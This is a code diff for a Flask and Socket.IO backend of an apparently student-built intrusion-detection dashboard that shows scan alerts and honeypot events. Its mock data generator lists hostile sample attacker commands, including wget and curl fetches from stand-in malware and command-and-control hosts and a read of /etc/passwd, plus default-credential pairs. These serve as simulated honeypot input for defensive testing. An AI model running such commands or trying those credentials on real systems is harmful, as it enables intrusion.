@@ -1,214 +1,235 @@
-# ============================================
-# Pôle 4 — Adil
-# AEGIS Dashboard: Flask + Socket.IO Backend
-# ============================================
+"""
+AEGIS Dashboard — Flask + Socket.IO Backend (v2)
+Serves the dashboard UI and handles real-time events.
+Includes a mock data generator for testing without the ML pipeline.
+"""
 
 import os
 import sys
-import json
 import time
+import random
 import threading
 from datetime import datetime
+
 from flask import Flask, render_template, jsonify, request
-from flask_socketio import SocketIO
+from flask_socketio import SocketIO, emit
 
-# Add project root to path for config import
-sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
-import config
-
-# ── Flask App ──────────────────────────────────────
+# ── App Setup ─────────────────────────────────
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "aegis-dashboard-secret"
-socketio = SocketIO(app, cors_allowed_origins="*")
+app.config['SECRET_KEY'] = os.urandom(24).hex()
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# ── In-Memory State ───────────────────────────────
-# These get updated by the detection pipeline and pushed to the browser
-state = {
-    "alerts": [],              # List of detection alerts
-    "active_scanners": {},     # {ip: {scan_type, confidence, first_seen, last_seen, ports_count}}
-    "attacker_profiles": {},   # {ip: {detailed profile with honeypot info}}
-    "blocked_ips": [],         # List of blocked IPs
-    "honeypot_events": [],     # Honeypot interaction log
-    "mtd_events": [],          # MTD rotation log
-    "stats": {                 # Summary counters
-        "total_alerts": 0,
-        "active_threats": 0,
-        "blocked_count": 0,
-        "honeypot_hits": 0,
-    }
+# ── In-Memory State ───────────────────────────
+system_state = {
+    'alerts': [],           # List of alert dicts
+    'scanners': {},         # { ip: { scan_type, confidence, alert_count, blocked, ... } }
+    'honeypot_events': [],  # List of honeypot interaction dicts
+    'blocked_ips': set(),
+    'start_time': time.time()
 }
 
-
-# ── Routes ─────────────────────────────────────────
-
-@app.route("/")
+# ── Routes ────────────────────────────────────
+@app.route('/')
 def index():
-    """Main dashboard page."""
-    return render_template("index.html")
+    """Serve the main dashboard page."""
+    return render_template('index.html')
 
 
-@app.route("/api/state")
+@app.route('/api/state')
 def get_state():
-    """Return current system state as JSON (for initial page load)."""
-    return jsonify(state)
-
-
-@app.route("/api/alert", methods=["POST"])
-def receive_alert():
-    """
-    Receive a detection alert from the capture/ML pipeline.
-    
-    Expected JSON body:
-    {
-        "src_ip": "192.168.1.105",
-        "prediction": "PORT_SCAN",
-        "confidence": 0.92,
-        "scan_type": "SYN",
-        "features": [12-element list],
-        "honeypot_flag": 0 or 1,
-        "timestamp": "2026-04-28T21:30:00"
-    }
-    """
-    data = request.json
-    if not data:
-        return jsonify({"error": "No data"}), 400
-
-    src_ip = data.get("src_ip", "unknown")
-    confidence = data.get("confidence", 0.0)
-    scan_type = data.get("scan_type", "UNKNOWN")
-    honeypot_flag = data.get("honeypot_flag", 0)
-    timestamp = data.get("timestamp", datetime.now().isoformat())
-
-    # Build alert object
-    alert = {
-        "id": len(state["alerts"]) + 1,
-        "src_ip": src_ip,
-        "prediction": data.get("prediction", "PORT_SCAN"),
-        "confidence": round(confidence, 3),
-        "scan_type": scan_type,
-        "honeypot_flag": honeypot_flag,
-        "timestamp": timestamp,
-        "severity": _compute_severity(confidence, honeypot_flag),
-    }
-
-    # Update state
-    state["alerts"].insert(0, alert)  # newest first
-    state["alerts"] = state["alerts"][:100]  # keep last 100
-    state["stats"]["total_alerts"] += 1
-
-    # Update active scanners
-    if src_ip not in state["active_scanners"]:
-        state["active_scanners"][src_ip] = {
-            "scan_type": scan_type,
-            "confidence": confidence,
-            "first_seen": timestamp,
-            "last_seen": timestamp,
-            "alert_count": 1,
-            "honeypot_hit": honeypot_flag == 1,
-        }
-    else:
-        scanner = state["active_scanners"][src_ip]
-        scanner["last_seen"] = timestamp
-        scanner["alert_count"] += 1
-        scanner["confidence"] = max(scanner["confidence"], confidence)
-        if honeypot_flag == 1:
-            scanner["honeypot_hit"] = True
-
-    state["stats"]["active_threats"] = len(state["active_scanners"])
-
-    # Push to all connected browsers via Socket.IO
-    socketio.emit("new_alert", alert)
-    socketio.emit("state_update", {
-        "stats": state["stats"],
-        "active_scanners": state["active_scanners"],
+    """Return current system state as JSON."""
+    return jsonify({
+        'alerts': system_state['alerts'][-50:],
+        'scanners': system_state['scanners'],
+        'honeypot_events': system_state['honeypot_events'][-20:],
+        'blocked_ips': list(system_state['blocked_ips']),
+        'uptime_seconds': int(time.time() - system_state['start_time'])
     })
 
-    return jsonify({"status": "ok", "alert_id": alert["id"]})
 
-
-@app.route("/api/honeypot_event", methods=["POST"])
-def receive_honeypot_event():
+@app.route('/api/alert', methods=['POST'])
+def receive_alert():
     """
-    Receive honeypot interaction event from El Yazid's honeypot parser.
-    
-    Expected JSON body:
-    {
-        "src_ip": "192.168.1.105",
-        "service": "SSH",
-        "commands": ["cat /etc/passwd", "ls -la"],
-        "credentials": ["root:admin", "root:123456"],
-        "timestamp": "2026-04-28T21:35:00"
+    Receive an alert from the ML pipeline or capture engine.
+    Expected JSON: { src_ip, scan_type, confidence, dst_port, honeypot_flag }
+    """
+    data = request.get_json(silent=True)
+    if not data or 'src_ip' not in data:
+        return jsonify({'error': 'Missing src_ip'}), 400
+
+    alert = {
+        'src_ip': data.get('src_ip'),
+        'scan_type': data.get('scan_type', 'Unknown'),
+        'confidence': float(data.get('confidence', 0.5)),
+        'dst_port': data.get('dst_port'),
+        'honeypot_flag': bool(data.get('honeypot_flag', False)),
+        'timestamp': data.get('timestamp', datetime.utcnow().isoformat())
     }
+
+    # Store and broadcast
+    system_state['alerts'].append(alert)
+    if len(system_state['alerts']) > 200:
+        system_state['alerts'] = system_state['alerts'][-200:]
+
+    _update_scanner(alert)
+    socketio.emit('new_alert', alert)
+
+    return jsonify({'status': 'ok'}), 200
+
+
+@app.route('/api/honeypot', methods=['POST'])
+def receive_honeypot():
     """
-    data = request.json
+    Receive a honeypot interaction event.
+    Expected JSON: { src_ip, service, command, credentials, timestamp }
+    """
+    data = request.get_json(silent=True)
     if not data:
-        return jsonify({"error": "No data"}), 400
+        return jsonify({'error': 'No data'}), 400
 
     event = {
-        "id": len(state["honeypot_events"]) + 1,
-        "src_ip": data.get("src_ip", "unknown"),
-        "service": data.get("service", "UNKNOWN"),
-        "commands": data.get("commands", []),
-        "credentials": data.get("credentials", []),
-        "timestamp": data.get("timestamp", datetime.now().isoformat()),
+        'src_ip': data.get('src_ip', 'Unknown'),
+        'service': data.get('service', 'SSH'),
+        'command': data.get('command', ''),
+        'credentials': data.get('credentials', ''),
+        'timestamp': data.get('timestamp', datetime.utcnow().isoformat())
     }
 
-    state["honeypot_events"].insert(0, event)
-    state["honeypot_events"] = state["honeypot_events"][:50]
-    state["stats"]["honeypot_hits"] += 1
+    system_state['honeypot_events'].append(event)
+    if len(system_state['honeypot_events']) > 100:
+        system_state['honeypot_events'] = system_state['honeypot_events'][-100:]
 
-    # Update attacker profile with honeypot data
-    src_ip = event["src_ip"]
-    if src_ip not in state["attacker_profiles"]:
-        state["attacker_profiles"][src_ip] = {
-            "src_ip": src_ip,
-            "honeypot_interactions": [],
+    socketio.emit('honeypot_event', event)
+    return jsonify({'status': 'ok'}), 200
+
+
+# ── Socket.IO Events ─────────────────────────
+@socketio.on('connect')
+def handle_connect():
+    """Send current state to newly connected client."""
+    emit('state_update', {
+        'scanners': system_state['scanners'],
+        'alerts': system_state['alerts'][-50:]
+    })
+
+
+@socketio.on('block_ip')
+def handle_block(data):
+    """Block an IP address (add to blocked set)."""
+    ip = data.get('ip')
+    if ip:
+        system_state['blocked_ips'].add(ip)
+        if ip in system_state['scanners']:
+            system_state['scanners'][ip]['blocked'] = True
+        socketio.emit('state_update', {'scanners': system_state['scanners']})
+
+
+# ── Internal Helpers ──────────────────────────
+def _update_scanner(alert):
+    """Update scanner tracking from an alert."""
+    ip = alert['src_ip']
+    if ip not in system_state['scanners']:
+        system_state['scanners'][ip] = {
+            'scan_type': alert['scan_type'],
+            'confidence': alert['confidence'],
+            'alert_count': 0,
+            'honeypot': False,
+            'blocked': ip in system_state['blocked_ips'],
+            'first_seen': alert['timestamp'],
+            'last_seen': alert['timestamp'],
+            'ports_probed': [],
+            'events': []
         }
-    state["attacker_profiles"][src_ip]["honeypot_interactions"].append(event)
 
-    socketio.emit("honeypot_event", event)
-
-    return jsonify({"status": "ok"})
-
-
-@app.route("/api/block", methods=["POST"])
-def block_attacker():
-    """Manually trigger IP block from dashboard."""
-    data = request.json
-    ip = data.get("ip")
-    if ip and ip not in state["blocked_ips"]:
-        state["blocked_ips"].append(ip)
-        state["stats"]["blocked_count"] = len(state["blocked_ips"])
-        # TODO: Call response_engine.block_ip(ip) here
-        socketio.emit("ip_blocked", {"ip": ip})
-    return jsonify({"status": "ok"})
+    s = system_state['scanners'][ip]
+    s['alert_count'] = s.get('alert_count', 0) + 1
+    s['confidence'] = max(s.get('confidence', 0), alert['confidence'])
+    s['last_seen'] = alert['timestamp']
+    if alert.get('honeypot_flag'):
+        s['honeypot'] = True
+    if alert.get('dst_port') and alert['dst_port'] not in s.get('ports_probed', []):
+        s['ports_probed'].append(alert['dst_port'])
+    s.setdefault('events', []).append({
+        'time': alert['timestamp'],
+        'type': 'alert',
+        'detail': f"{alert['scan_type']} ({int(alert['confidence']*100)}%)"
+    })
 
 
-# ── Helpers ────────────────────────────────────────
+# ══════════════════════════════════════════════
+# MOCK DATA GENERATOR — for testing only
+# Start with: python app.py --mock
+# ══════════════════════════════════════════════
 
-def _compute_severity(confidence, honeypot_flag):
-    """Compute alert severity based on confidence and honeypot interaction."""
-    if honeypot_flag == 1:
-        return "CRITICAL"
-    elif confidence >= 0.90:
-        return "HIGH"
-    elif confidence >= 0.75:
-        return "MEDIUM"
+MOCK_IPS = [
+    '192.168.1.105', '10.0.0.42', '172.16.0.88',
+    '192.168.1.201', '10.0.0.77', '172.16.0.33'
+]
+MOCK_SCAN_TYPES = ['SYN Scan', 'NULL Scan', 'FIN Scan', 'XMAS Scan', 'ACK Scan', 'UDP Scan']
+MOCK_SERVICES = ['SSH', 'HTTP', 'FTP', 'Telnet', 'SMB']
+MOCK_COMMANDS = [
+    'cat /etc/passwd', 'uname -a', 'whoami', 'ls -la',
+    'wget http://malware.evil/bot.sh', 'curl http://c2.attacker/payload',
+    'id', 'ifconfig', 'netstat -an'
+]
+MOCK_CREDENTIALS = [
+    'root:admin', 'admin:admin', 'root:toor', 'pi:raspberry',
+    'admin:password', 'test:test', 'user:123456'
+]
+
+
+def mock_data_loop():
+    """Generate mock alerts and honeypot events every 2-5 seconds."""
+    print("[MOCK] Starting mock data generator...")
+    time.sleep(2)  # Wait for server to start
+
+    while True:
+        ip = random.choice(MOCK_IPS)
+        scan_type = random.choice(MOCK_SCAN_TYPES)
+        confidence = round(random.uniform(0.3, 0.99), 2)
+        dst_port = random.choice([22, 80, 443, 8080, 3306, 21, 25, 53, 445, 3389,
+                                  random.randint(1000, 65535)])
+
+        alert = {
+            'src_ip': ip,
+            'scan_type': scan_type,
+            'confidence': confidence,
+            'dst_port': dst_port,
+            'honeypot_flag': random.random() > 0.7,
+            'timestamp': datetime.utcnow().isoformat()
+        }
+
+        system_state['alerts'].append(alert)
+        if len(system_state['alerts']) > 200:
+            system_state['alerts'] = system_state['alerts'][-200:]
+        _update_scanner(alert)
+        socketio.emit('new_alert', alert)
+
+        # Occasionally send honeypot events
+        if random.random() > 0.6:
+            hp_event = {
+                'src_ip': ip,
+                'service': random.choice(MOCK_SERVICES),
+                'command': random.choice(MOCK_COMMANDS),
+                'credentials': random.choice(MOCK_CREDENTIALS),
+                'timestamp': datetime.utcnow().isoformat()
+            }
+            system_state['honeypot_events'].append(hp_event)
+            socketio.emit('honeypot_event', hp_event)
+
+        time.sleep(random.uniform(1.5, 4.0))
+
+
+# ── Main ──────────────────────────────────────
+if __name__ == '__main__':
+    use_mock = '--mock' in sys.argv
+
+    if use_mock:
+        mock_thread = threading.Thread(target=mock_data_loop, daemon=True)
+        mock_thread.start()
+        print("[AEGIS] Dashboard running with MOCK DATA on http://localhost:5000")
     else:
-        return "LOW"
+        print("[AEGIS] Dashboard running on http://localhost:5000")
+        print("[AEGIS] Use --mock flag for test data: python app.py --mock")
 
-
-# ── Main ───────────────────────────────────────────
-
-if __name__ == "__main__":
-    print("=" * 50)
-    print("  AEGIS Dashboard starting...")
-    print(f"  http://{config.DASHBOARD_HOST}:{config.DASHBOARD_PORT}")
-    print("=" * 50)
-    socketio.run(
-        app,
-        host=config.DASHBOARD_HOST,
-        port=config.DASHBOARD_PORT,
-        debug=True,
-        allow_unsafe_werkzeug=True,
-    )
+    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
